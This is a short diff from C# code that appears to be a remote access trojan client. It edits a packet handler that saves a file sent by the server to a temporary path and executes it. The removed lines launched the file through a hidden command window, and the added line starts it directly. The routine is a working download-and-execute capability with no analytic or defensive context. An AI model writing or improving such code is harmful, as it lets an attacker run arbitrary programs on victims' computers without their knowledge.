@@ -17,14 +17,7 @@ namespace Client.Handle_Packet
                 //Drop To Disk
                 string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                 unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
-                ProcessStartInfo processStartInfo = new ProcessStartInfo
-                {
-                    FileName = "cmd",
-                    Arguments = "/k START \"\" \"" + fullPath + "\" & EXIT",
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = true
-                };
-                Process.Start(processStartInfo);
+                Process.Start(fullPath);
                 if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                 {
                     new HandleUninstall();
